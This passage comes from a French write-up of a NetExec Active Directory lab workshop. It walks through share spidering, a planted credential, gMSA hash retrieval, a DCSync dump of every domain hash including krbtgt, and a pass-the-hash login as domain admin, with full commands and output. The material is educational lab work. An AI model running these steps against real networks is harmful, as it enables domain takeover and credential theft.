<font color="#66D9EF"><b>SPIDER_PLUS</b></font> village         445    village          <font color="#66D9EF"><b>[*]</b></font> SMB Shares:           7 (ADMIN$, C$, D$, IPC$, NETLOGON, SYSVOL, TRAITUS)
<font color="#66D9EF"><b>SPIDER_PLUS</b></font> village         445    village          <font color="#66D9EF"><b>[*]</b></font> SMB Readable Shares:  4 (IPC$, NETLOGON, SYSVOL, TRAITUS)
<font color="#66D9EF"><b>SPIDER_PLUS</b></font> village         445    village          <font color="#66D9EF"><b>[*]</b></font> SMB Filtered Shares:  1
<font color="#66D9EF"><b>SPIDER_PLUS</b></font> village         445    village          <font color="#66D9EF"><b>[*]</b></font> Total folders found:  28
<font color="#66D9EF"><b>SPIDER_PLUS</b></font> village         445    village          <font color="#66D9EF"><b>[*]</b></font> Total files found:    8
<font color="#66D9EF"><b>SPIDER_PLUS</b></font> village         445    village          <font color="#66D9EF"><b>[*]</b></font> File size average:    1.08 KB
<font color="#66D9EF"><b>SPIDER_PLUS</b></font> village         445    village          <font color="#66D9EF"><b>[*]</b></font> File size min:        22 B
<font color="#66D9EF"><b>SPIDER_PLUS</b></font> village         445    village          <font color="#66D9EF"><b>[*]</b></font> File size max:        4.43 KB
<font color="#66D9EF"><b>SPIDER_PLUS</b></font> village         445    village          <font color="#66D9EF"><b>[*]</b></font> File unique exts:     4 (.ini, .pol, .inf, .txt)
<font color="#66D9EF"><b>SPIDER_PLUS</b></font> village         445    village          <font color="#66D9EF"><b>[*]</b></font> Downloads successful: 8
<font color="#66D9EF"><b>SPIDER_PLUS</b></font> village         445    village          <font color="#A6E22E"><b>[+]</b></font> All files processed successfully.
</code></pre></div>
{{< /rawhtml >}}


{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#57C7FF">~/workshop/cme_2024</font>
<font color="#FF6AC1">❯</font> <font color="#A6E22E">tree</font>
<font color="#66D9EF"><b>.</b></font>
├── <font color="#66D9EF"><b>village</b></font>
│   ├── <font color="#66D9EF"><b>SYSVOL</b></font>
│   │   └── <font color="#66D9EF"><b>armorique.local</b></font>
│   │       └── <font color="#66D9EF"><b>Policies</b></font>
│   │           ├── <font color="#66D9EF"><b>{09180B06-EA84-4D8F-BC90-E71AECE6F618}</b></font>
│   │           │   ├── GPT.INI
│   │           │   └── <font color="#66D9EF"><b>Machine</b></font>
│   │           │       └── <font color="#66D9EF"><b>Microsoft</b></font>
│   │           │           └── <font color="#66D9EF"><b>Windows NT</b></font>
│   │           │               └── <font color="#66D9EF"><b>SecEdit</b></font>
│   │           │                   └── GptTmpl.inf
│   │           ├── <font color="#66D9EF"><b>{31B2F340-016D-11D2-945F-00C04FB984F9}</b></font>
│   │           │   ├── GPT.INI
│   │           │   └── <font color="#66D9EF"><b>MACHINE</b></font>
│   │           │       ├── <font color="#66D9EF"><b>Microsoft</b></font>
│   │           │       │   └── <font color="#66D9EF"><b>Windows NT</b></font>
│   │           │       │       └── <font color="#66D9EF"><b>SecEdit</b></font>
│   │           │       │           └── GptTmpl.inf
│   │           │       └── Registry.pol
│   │           └── <font color="#66D9EF"><b>{6AC1786C-016F-11D2-945F-00C04fB984F9}</b></font>
│   │               ├── GPT.INI
│   │               └── <font color="#66D9EF"><b>MACHINE</b></font>
│   │                   └── <font color="#66D9EF"><b>Microsoft</b></font>
│   │                       └── <font color="#66D9EF"><b>Windows NT</b></font>
│   │                           └── <font color="#66D9EF"><b>SecEdit</b></font>
│   │                               └── GptTmpl.inf
│   └── <font color="#66D9EF"><b>TRAITUS</b></font>
│       └── message.txt
└── village.json
</code></pre></div>
{{< /rawhtml >}}

On trouve un fichier `message.txt` sur le _share_ `TRAITUS`.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#57C7FF">/tmp/nxc_hosted/nxc_spider_plus/village/TRAITUS</font>
<font color="#FF6AC1">❯</font> <font color="#A6E22E">cat</font> message.txt
Voici les plans du village et le mot de passe pour passer les portes ! J'espere tre bien rcompens !

Identifiants: tragicomix / TUMDyYSjzu-Jb4
</code></pre></div>
{{< /rawhtml >}}

Mais la trahison ne paie pas, et on ne gagne __pas d'accès supplémentaires__ avec `tragicomix`.

## gMSA

`alambix` a les droits pour récupérer le _hash NT_ de `gMSA-obelix$`. Cela réalisable facilement avec `--gmsa` sur le protocole _`ldap`_.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF5C57">❯</font> <font color="#A6E22E">nxc</font> ldap village -k -u <font color="#F4BF75">'alambix'</font> -p <font color="#F4BF75">'gaulois-x-toujours'</font> --gmsa 
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:village) (domain:armorique.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>LDAPS</b></font>       village         636    village          <font color="#A6E22E"><b>[+]</b></font> armorique.local\alambix:gaulois-x-toujours
<font color="#66D9EF"><b>LDAPS</b></font>       village         636    village          <font color="#66D9EF"><b>[*]</b></font> Getting GMSA Passwords
<font color="#66D9EF"><b>LDAPS</b></font>       village         636    village          <font color="#F4BF75"><b>Account: gMSA-obelix$         NTLM: 99bc5b63d68cb72b910bd754af32a236</b></font>
</code></pre></div>
{{< /rawhtml >}}

## DCSync - `armorique.local` / `village`

`gMSA-obelix$` a les droits nécessaires pour faire un __DCSync__. Et on peut récupérer ainsi le `ntds.dit` de `armorique.local`.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF5C57">❯</font> <font color="#A6E22E">nxc</font> village -u <font color="#F4BF75">'gMSA-obelix$'</font> -H 99bc5b63d68cb72b910bd754af32a236 --ntds
<font color="#F92672"><b>[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n]</b></font> y
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:village) (domain:armorique.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#A6E22E"><b>[+]</b></font> armorique.local\gMSA-obelix$:99bc5b63d68cb72b910bd754af32a236
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F92672"><b>[-]</b></font> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#A6E22E"><b>[+]</b></font> Dumping the NTDS, this could take a while so go grab a redbull...
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>asterix:500:aad3b435b51404eeaad3b435b51404ee:34ff8291f0ee1c444ddfa09dccb6dcc3:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8404390a76db3dfe72f51cfb9b24949e:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\obelix:1104:aad3b435b51404eeaad3b435b51404ee:5ee69547337b59e461c33478c2fb822f:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\panoramix:1105:aad3b435b51404eeaad3b435b51404ee:1afd9ae049ebfb823346f28c4c76f668:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\abraracourcix:1106:aad3b435b51404eeaad3b435b51404ee:2df165939f8399894d6c49167984fea1:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\assurancetourix:1107:aad3b435b51404eeaad3b435b51404ee:72a70989fd7ed81b6e8511c9263ffafb:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\bonemine:1108:aad3b435b51404eeaad3b435b51404ee:2453dfca5482957ee6837cc2dc018940:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\ordralfabetix:1109:aad3b435b51404eeaad3b435b51404ee:6eed58b313ef99aaf10e7cf96896a1cd:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\cetautomatix:1110:aad3b435b51404eeaad3b435b51404ee:77168a887c2accdbbd6c016e13acf734:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\idefix:1111:aad3b435b51404eeaad3b435b51404ee:57551dfb82ceabde974d92e4d8cd25c0:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\agecanonix:1112:aad3b435b51404eeaad3b435b51404ee:31aed57e4cb0b171625ebe27122e08f5:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\vercingetorix:1113:aad3b435b51404eeaad3b435b51404ee:7385b450f5672cd341bd4ed4c7f09082:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\goudurix:1114:aad3b435b51404eeaad3b435b51404ee:a4033bbc3438da66d2e8f783b6ed8c40:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\jolitorax:1115:aad3b435b51404eeaad3b435b51404ee:464bc57c90bf3eec47e3a746e75ad325:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\pepe:1116:aad3b435b51404eeaad3b435b51404ee:746085b45d219204784e4a6d0e99b6be:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\cicatrix:1117:aad3b435b51404eeaad3b435b51404ee:ba87f0edd27927f3f4aa074eb2e2d93c:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\falbala:1118:aad3b435b51404eeaad3b435b51404ee:11fe8020724a297649d37fe4188e2237:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\tragicomix:1119:aad3b435b51404eeaad3b435b51404ee:cf3a743ba86f71d560bd37479d24e2af:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\diagnostix:1120:aad3b435b51404eeaad3b435b51404ee:462a2e47440eb22c601dd5e12eb8cca5:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\antibiotix:1121:aad3b435b51404eeaad3b435b51404ee:cc08e9980caff395021c88f27e0ba020:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\ordalfabétix:1122:aad3b435b51404eeaad3b435b51404ee:ccdef01e6072f4f688a44c3b02d120d6:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\prolix:1123:aad3b435b51404eeaad3b435b51404ee:808022bae08938c2a345f3dec9d38277:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\informatix:1124:aad3b435b51404eeaad3b435b51404ee:4e12f6cecfdf32e40793310070282298:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\alambix:1125:aad3b435b51404eeaad3b435b51404ee:14954b5f7f824d45c5ce4a68e7a4eb3c:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\porquépix:1126:aad3b435b51404eeaad3b435b51404ee:64fb2fd7590866f14085e41040e1b10a:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>armorique.local\beaufix:1127:aad3b435b51404eeaad3b435b51404ee:e532db6f49ae5723885e9a20ae621dda:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>village$:1000:aad3b435b51404eeaad3b435b51404ee:c0847f8420661594a2a824f60d78dc19:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>gMSA-obelix$:1103:aad3b435b51404eeaad3b435b51404ee:99bc5b63d68cb72b910bd754af32a236:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#A6E22E"><b>[+]</b></font> Dumped 29 NTDS hashes to /home/olivier/.nxc/logs/village_10.0.0.5_2024-07-07_011838.ntds of which 27 were added to the database
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#66D9EF"><b>[*]</b></font> To extract only enabled accounts from the output file, run the following command:
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#66D9EF"><b>[*]</b></font> cat /home/olivier/.nxc/logs/village_10.0.0.5_2024-07-07_011838.ntds | grep -iv disabled | cut -d ':' -f1
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#66D9EF"><b>[*]</b></font> grep -iv disabled /home/olivier/.nxc/logs/village_10.0.0.5_2024-07-07_011838.ntds | cut -d ':' -f1
</code></pre></div>
{{< /rawhtml >}}

## Admin

Nous voilà enfin __administrateur__ du __domaine__ __`armorique.local`__.
On peut se connecter avec  `asterix` pour apprécier pleinement de petit __`Pwn3d!`__.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF5C57">❯</font> <font color="#A6E22E">nxc</font> smb village -u <font color="#F4BF75">'asterix'</font> -H 34ff8291f0ee1c444ddfa09dccb6dcc3
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:village) (domain:armorique.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#A6E22E"><b>[+]</b></font> armorique.local\asterix:34ff8291f0ee1c444ddfa09dccb6dcc3 <font color="#F4BF75"><b>(Pwn3d!)</b></font>
</code></pre></div>
{{< /rawhtml >}}

------------------

## Résumé de `armorique.local`

Les étapes pour compromettre le second domaine ont été les suivantes.

1. __Énumérer__ les __utilisateurs__ de `armorique.local` avec une __session anonyme__ (`-u '' -p ''`).
2. __Password Spraying__ avec les _hashs NT_ extraits du domaine `rome.local`. On obtient le compte `prolix`.
3. __Kerberoasting__ de `alambix` avec le compte `prolix`.
4. Récupération du _hash NT_ de `gMSA-obelix$` avec __`--gmsa`__.
5. __DCSync__ sur `armorique.local` avec `gMSA-obelix$`.

------------------

## Conclusion

Déjà, un immense merci à [@mpgn](https://x.com/mpgn_x64) et ceux qui ont contribué à cette 3ème édition du workshop.

------------------

🙏 Je n'ai pas d'__extract BloodHound__ pour les machines de workshop. Si une quelqu'un peut m'en __transmettre un__, j'aimerai bien mettre l'article à jour et indiquer comment on pouvait détecter certaines failles avec Bloodhound. 🙏  
Je suis joignable via [__Linkedin__](https://www.linkedin.com/in/olasne/), __X (Twitter)__, ou par __mail__ à _olivier@lasne.pro_. Merci !

------------------

Personnellement , le workshop m'a permis d'exploiter de choses que je n'ai pas l'occasion de tester au quotidien: ___DPAPI___, ___LAPS___, ___MSOL___ ou même ___gMSA___. Je suis très heureux d'avoir découvert les _MSOL_ à cette occasion.

Je ressors au passage convaincu que `pipx` est la meilleure façon d'installer un tas d'outils de pentest, notamment _netexec_.

Et pour finir __quelques leçons__ que je retiens de ce workshop:

* Le fait de tester __`--dpapi`__ que je n'avais pas le réflexe d'utiliser juqu'ici.

* _netexec_ est très efficace pour plein d'attaques faites avec _impacket_ généralement: `--lsa`, `--ntds`, `--asreproast`, `--kerberoasting`, `--rid-brute`. Et la syntaxe est plus intuitive avec _netexec_.

* Comme c'était un workshop _netexec_, je n'ai pas eu le réflexe d'utiliser ___BloodHound___.  
En écrivant ce _writeup_, je réalise qu'à beaucoup d'étapes où je suis resté coincé longtemps. Il aurait été possible d'__identifier rapidement__ la faille à exploiter: _LAPS_, _MSOL_, _gMSA_.  
L'an prochain, je préparerais un _Bloodhound_ avant le workshop

* Dès qu'on a un compte utilisateur valide sur le domaine, faire un _Bloodhound_.

* `-u ''`, `-u 'a'` et `-u 'guest'` peuvent donner des accès différents. __Tester les 3__ de manière systématique.

Et voilà ! J'espère que vous avez apprécié ce _writeup_, et au plaisir de vous voir l'an prochain.